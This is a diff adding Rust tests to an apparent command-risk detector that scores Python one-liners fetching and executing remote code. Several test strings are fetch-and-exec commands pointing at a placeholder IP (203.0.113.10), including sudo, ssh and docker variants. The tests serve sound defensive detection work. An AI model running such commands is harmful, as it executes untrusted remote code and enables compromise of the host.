@@ -220,3 +220,58 @@ fn a_download_beside_a_command_that_does_not_run_it_does_not_chain() {
         assert!(!linked(&[(command, None)]), "{command}");
     }
 }
+
+const PYTHON_FETCH_EXEC: &str = "python3 -c \"import urllib.request;exec(urllib.request.urlopen('https://203.0.113.10/x.py').read())\"";
+
+#[test]
+fn a_python_one_liner_that_runs_a_fetched_response_chains() {
+    let (score, ids) = session(&[(PYTHON_FETCH_EXEC, None)]);
+    assert_eq!(
+        ids,
+        [
+            "chain.download_then_execute",
+            "execution.shell",
+            "network.download"
+        ]
+    );
+    assert_eq!(score, 70);
+    for command in [
+        "python -c \"import requests; u='https://203.0.113.10/x.py'; exec(requests.get(u).text)\"",
+        "py -c \"import requests; r = requests.get('https://203.0.113.10/x.py'); exec(r.text)\"",
+        "sudo env A=1 python3 -c \"import urllib.request;exec(urllib.request.urlopen('https://203.0.113.10/x.py').read())\"",
+    ] {
+        assert_eq!(session(&[(command, None)]).0, 70, "{command}");
+    }
+}
+
+#[test]
+fn a_python_one_liner_that_does_not_run_its_fetch_is_no_download() {
+    for command in [
+        "python3 -c \"import urllib.request; print(urllib.request.urlopen('https://203.0.113.10/x').status)\"",
+        "python3 -c \"import json, requests; print(json.loads(requests.get('https://203.0.113.10/a.json').text))\"",
+        "python3 -c \"import requests; open('x.py', 'w').write(requests.get('https://203.0.113.10/x.py').text)\"",
+        "python3 -c \"import requests; requests.get('https://203.0.113.10/x'); exec('print(1)')\"",
+        "python3 script.py https://203.0.113.10/x.py",
+        "pip install requests",
+    ] {
+        let ids = session(&[(command, None)]).1;
+        assert!(
+            !ids.iter().any(|id| id == "network.download" || id == CHAIN),
+            "{command}: {ids:?}"
+        );
+    }
+}
+
+/// A one-liner another host or a container runs fetches there: a download,
+/// as the launchers' other downloads are, that no local command runs.
+#[test]
+fn a_python_one_liner_run_elsewhere_reads_as_a_download_without_a_chain() {
+    for command in [
+        "ssh host \"python3 -c 'import urllib.request;exec(urllib.request.urlopen(\\\"https://203.0.113.10/x.py\\\").read())'\"",
+        "docker exec c python3 -c \"import urllib.request;exec(urllib.request.urlopen('https://203.0.113.10/x.py').read())\"",
+    ] {
+        let (score, ids) = session(&[(command, None)]);
+        assert_eq!(ids, ["execution.shell", "network.download"], "{command}");
+        assert_eq!(score, 35, "{command}");
+    }
+}
